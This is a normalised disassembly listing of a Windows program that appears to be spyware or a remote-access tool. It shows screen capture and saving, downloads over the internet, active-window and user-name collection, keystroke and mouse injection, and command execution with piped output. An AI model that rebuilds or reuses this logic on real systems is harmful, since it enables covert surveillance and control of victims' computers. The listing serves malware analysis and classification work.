lea ecx [ ebp - 0x84 ]
call sub_40dda1
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_40dd42
push ebp
mov ebp esp
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
push [ ebp + 0x8 ]
je r-xdata
call GdipLoadImageFromStream
call GdipLoadImageFromStreamICM
jmp r-xdata
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
retn 0x8
sub_40dd75
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40dda1
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40dd94
pop ecx
sub_40ddb0
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
mov esi ecx
push eax
push [ esi + 0x4 ]
call GdipCloneImage
push eax
mov ecx esi
call sub_40ddfc
push 0x10
call sub_40ddef
test eax eax
pop ecx
je r-xdata
xor eax eax
push [ esi + 0x8 ]
mov ecx eax
push [ ebp - 0x4 ]
call sub_40de35
jmp r-xdata
pop esi
leave
retn
sub_40de11
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call GdipSaveImageToStream
push eax
mov ecx esi
call sub_40ddfc
pop esi
pop ebp
retn 0xc
sub_40de35
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x8 ]
mov [ esi ] r--data
call sub_40de56
mov eax [ ebp + 0xc ]
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
retn 0x8
sub_40de63
push ebp
mov ebp esp
sub esp 0x10
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
push esi
lea ecx [ ebp + 0xc ]
push [ eax ]
push 0x0
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx rw-data
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
add esi eax
lea eax [ ebp - 0x10 ]
push esi
push eax
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
call sub_40da55
pop ecx
pop ecx
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
leave
retn
sub_40decb
push ebp
mov ebp esp
sub esp 0x5a8
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
shl esi 0x1
lea eax [ esi + esi ]
push eax
call ??2@YAPAXI@Z
push esi
mov edi eax
push [ ebp + 0x8 ]
push edi
call [ mbstowcs@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call sub_40d71e
xor ebx ebx
add esp 0x14
cmp [ rw-data ] ebx
jne r-xdata
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ rw-data ]
push ebx
push eax
lea ecx [ ebp - 0x58 ]
call sub_40dd42
lea eax [ ebp - 0x68 ]
push eax
push r--data
call sub_40d999
pop ecx
lea eax [ ebp - 0x68 ]
pop ecx
push ebx
push eax
push edi
lea ecx [ ebp - 0x58 ]
call sub_40e133
push edi
call sub_40fc2c
pop ecx
push 0x1b
mov ecx rw-data
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
push 0xc
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
lea ecx [ ebp - 0x58 ]
call sub_40dda1
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
push 0x1
push 0x24
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x110 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::basic_ifstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x110 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
lea ecx [ ebp - 0x110 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea eax [ ebp - 0x80 ]
lea ecx [ ebp - 0x110 ]
push eax
call [ std::basic_istream<char,struct std::char_traits<char> >::tellg@IAT ]
push 0x6
mov esi eax
pop ecx
lea edi [ ebp - 0x38 ]
[ edi ] [ esi ]
lea ecx [ ebp - 0x38 ]
call sub_405288
push eax
call ??2@YAPAXI@Z
pop ecx
mov edi eax
push ebx
push ebx
lea ecx [ ebp - 0x110 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::seekg@IAT ]
lea ecx [ ebp - 0x38 ]
call sub_405288
push eax
push edi
lea ecx [ ebp - 0x110 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
lea ecx [ ebp - 0x110 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::close@IAT ]
push [ ebp + 0x8 ]
call [ DeleteFileA@IAT ]
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
push eax
lea ecx [ ebp - 0x5a8 ]
call sub_4028eb
lea ecx [ ebp - 0x38 ]
call sub_405288
push eax
lea eax [ ebp - 0x48 ]
push edi
push eax
lea ecx [ ebp - 0x5a8 ]
call sub_402a2a
push edi
call sub_40fc2c
pop ecx
lea eax [ ebp + 0xb ]
push eax
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
sub eax 0x3
lea ecx [ ebp - 0x10 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
lea eax [ ebp - 0x10 ]
push r--data
push eax
lea eax [ ebp - 0x78 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x10 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x78 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
push 0x20
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x19c ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0x38 ]
call sub_405288
push eax
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x19c ]
call [ std::basic_ostream<char,struct std::char_traits<char> >::write@IAT ]
lea ecx [ ebp - 0x19c ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
lea ecx [ ebp - 0x19c ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40e133
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call GdipSaveImageToFile
push eax
mov ecx esi
call sub_40ddfc
pop esi
pop ebp
retn 0xc
sub_40e157
mov eax sub_40ffd0
call _EH_prolog
sub esp 0xc4
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ rw-data ] ebx
jne r-xdata
push 0x1a
mov esi rw-data
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x19
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call sub_40712f
add esp 0xc
push eax
mov edi rw-data
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebx
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ CreateDirectoryA@IAT ]
mov [ ebp - 0x40 ] r--data
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ebp - 0x3c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ rw-data ] 0x1
mov edi [ Sleep@IAT ]
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x50 ]
call sub_40dd21
push ebx
lea eax [ ebp - 0x50 ]
push eax
push rw-data
call GdiplusStartup
cmp [ rw-data ] 0x1
je r-xdata
push ebx
push 0x17
mov ecx esi
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40f4a3
add esp 0x14
mov [ rw-data ] al
cmp al bl
jne r-xdata
push 0x15
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
imul eax eax 0xea60
push 0xa
lea eax [ ebp - 0x1c ]
push eax
push [ rw-data ]
call [ _itoa@IAT ]
add esp 0xc
push [ ebp - 0x40 ]
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x7c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
push r--data
push rw-data
lea eax [ ebp - 0x90 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0xa0 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xb0 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0xb0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xa0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x90 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x7c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1b
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push 0x3e8
call edi
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
je r-xdata
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x3c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
push r--data
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
sub eax 0x3
push eax
push ebx
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea eax [ ebp - 0xd0 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea ecx [ ebp - 0x3c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0xd0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xc0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_40decb
pop ecx
inc [ rw-data ]
cmp [ ebp + 0x8 ] ebx
jne r-xdata
inc [ rw-data ]
jmp r-xdata
lea ecx [ ebp - 0x3c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_40f44c
pop ecx
test al al
je r-xdata
push 0x18
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
imul eax eax 0x3e8
jmp r-xdata
push eax
call edi
jmp r-xdata
sub_40e414
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
sub eax 0x0
je r-xdata
push 0x2
pop ecx
push 0x4
dec eax
je r-xdata
mov edx [ ebp + 0xc ]
or eax ecx
and [ ebp - 0x1c ] 0x0
or ax 0x8001
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] edx
mov edx [ ebp + 0x10 ]
push 0x1c
push eax
push 0x1
mov [ ebp - 0x14 ] edx
call [ SendInput@IAT ]
leave
retn
push 0x8
pop ecx
push 0x10
jmp r-xdata
dec eax
jne r-xdata
pop eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
push 0x20
pop ecx
push 0x40
jmp r-xdata
sub_40e46d
push ebp
mov ebp esp
sub esp 0x1c
mov ax [ ebp + 0x8 ]
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] ax
push esi
mov esi [ SendInput@IAT ]
lea eax [ ebp - 0x1c ]
push 0x1c
push eax
push 0x1
mov [ ebp - 0x1c ] 0x1
call esi
lea eax [ ebp - 0x1c ]
push 0x1c
push eax
push 0x1
mov [ ebp - 0x14 ] 0x2
call esi
pop esi
leave
retn
sub_40e4e6
push ebp
mov ebp esp
sub esp 0x118
lea eax [ ebp - 0x118 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x118 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x14 ]
push [ eax ]
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find_last_of@IAT ]
push eax
push 0x0
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_40e549
push ebp
mov ebp esp
sub esp 0x24c
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x10
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x1
call [ rw-data ]
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] 0x100
push eax
lea eax [ ebp - 0x24c ]
push eax
call [ GetUserNameW@IAT ]
lea eax [ ebp - 0x24c ]
lea ecx [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
push [ ebp + 0x8 ]
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_40e5ce
push ebp
mov ebp esp
sub esp 0x20
push 0x0
push r--data
lea eax [ ebp - 0x10 ]
push 0x80000000
push eax
call sub_408ef1
add esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
add eax 0x4
lea ecx [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push 0x0
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push r--data
push r--data
sub esp 0x10
lea eax [ ebp - 0x10 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call sub_40eed4
add esp 0x1c
lea ecx [ ebp - 0x10 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_40e675
push ebp
mov ebp esp
sub esp 0x40
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] 0x40
push eax
call [ rw-data ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x38 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x4 ] ecx
leave
retn
sub_40e69c
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
call sub_40e675
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
leave
retn
sub_40e6bb
push ebp
mov ebp esp
sub esp 0x30
push esi
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x6
mov esi r--data
pop ecx
lea edi [ ebp - 0x30 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push 0x0
movsb [ edi ] [ esi ]
call [ time@IAT ]
add eax [ rw-data ]
push eax
call [ srand@IAT ]
mov esi [ rand@IAT ]
inc [ rw-data ]
pop ecx
pop ecx
call esi
push 0x1f
cdq
pop ecx
idiv ecx
add dl 0x4
movzx eax dl
test eax eax
jle r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
leave
retn
mov edi eax
call esi
push 0x1a
cdq
pop ecx
idiv ecx
lea ecx [ ebp - 0x14 ]
movzx eax dl
mov al [ ebp + eax - 0x30 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
dec edi
jne r-xdata
sub_40e750
push ebp
mov ebp esp
mov eax 0x271c
call sub_40fcf0
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
and [ ebp + 0x13 ] 0x0
xor esi esi
push esi
push esi
push esi
push 0x1
mov [ eax ] esi
push r--data
mov [ ebx ] esi
call [ InternetOpenA@IAT ]
push esi
push 0x80000000
push esi
push esi
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
push eax
call [ InternetOpenUrlA@IAT ]
cmp eax esi
mov [ ebp - 0x4 ] eax
je r-xdata
push [ ebp - 0xc ]
mov esi [ InternetCloseHandle@IAT ]
call esi
push [ ebp - 0x4 ]
call esi
mov al [ ebp + 0x13 ]
pop esi
pop ebx
leave
retn
push edi
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x8 ] esi
mov eax [ ebx ]
add eax [ ebp + 0x10 ]
push eax
call ??2@YAPAXI@Z
mov ecx [ ebx ]
mov esi [ ebp + 0x8 ]
mov edx ecx
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov [ ebp - 0x8 ] eax
and ecx 0x3
push [ ebp + 0x8 ]
[ edi ] [ esi ]
mov edi [ ebx ]
mov ecx [ ebp + 0x10 ]
add edi eax
mov eax ecx
lea esi [ ebp - 0x271c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
call sub_40fc2c
mov eax [ ebp - 0x8 ]
pop ecx
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x10 ]
add [ ebx ] eax
pop ecx
xor esi esi
jmp r-xdata
cmp [ ebp + 0x10 ] esi
jbe r-xdata
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x271c ]
push 0x2710
push eax
push [ ebp - 0x4 ]
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
push [ ebx ]
call ??2@YAPAXI@Z
pop ecx
mov esi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edi eax
mov [ ecx ] eax
mov ecx [ ebx ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov [ ebp + 0x13 ] 0x1
pop edi
sub_40e85d
push ebp
mov ebp esp
sub esp 0x204
call [ GetForegroundWindow@IAT ]
lea ecx [ ebp - 0x204 ]
push 0x200
push ecx
push eax
call [ GetWindowTextW@IAT ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x204 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_40e8b9
push ebp
mov ebp esp
mov eax 0xc444
call sub_40fcf0
push ebx
xor ebx ebx
test [ rw-data ] 0x1
push esi
push edi
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x3 ] bl
mov esi rw-data
jne r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x1c ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x34 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp + 0xc ]
push r--data
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
or [ rw-data ] 0x1
lea eax [ ebp - 0x1 ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push __imp_??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ_40ecd2
call sub_40fcba
pop ecx
lea eax [ ebp - 0x40 ]
push ebx
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x40 ] 0xc
mov [ ebp - 0x38 ] 0x1
mov [ ebp - 0x3c ] ebx
call [ CreatePipe@IAT ]
push 0x11
xor eax eax
pop ecx
lea edi [ ebp - 0xf4 ]
[ edi ]
push 0xfffffff6
mov [ ebp - 0xf4 ] 0x44
mov [ ebp - 0xc8 ] 0x101
mov [ ebp - 0xc4 ] bx
call [ GetStdHandle@IAT ]
mov [ ebp - 0xbc ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xb8 ] eax
mov [ ebp - 0xb4 ] eax
lea eax [ ebp - 0x50 ]
mov ecx esi
push eax
lea eax [ ebp - 0xf4 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push ebx
push ebx
push 0x1
push ebx
push ebx
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push ebx
call [ CreateProcessA@IAT ]
test eax eax
push 0x1f4
setne [ ebp - 0x1 ]
call [ Sleep@IAT ]
cmp [ ebp - 0x1 ] bl
je r-xdata
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov [ ebp - 0x2 ] 0x1
mov esi [ CloseHandle@IAT ]
lea eax [ ebp - 0x24 ]
push ebx
push eax
push ebx
push ebx
push ebx
push [ ebp - 0xc ]
call [ PeekNamedPipe@IAT ]
cmp [ ebp - 0x24 ] ebx
jbe r-xdata
push 0x3e
push rw-data
push 0xa
lea eax [ ebp - 0x34 ]
push 0xd
push eax
lea eax [ ebp - 0x70 ]
push eax
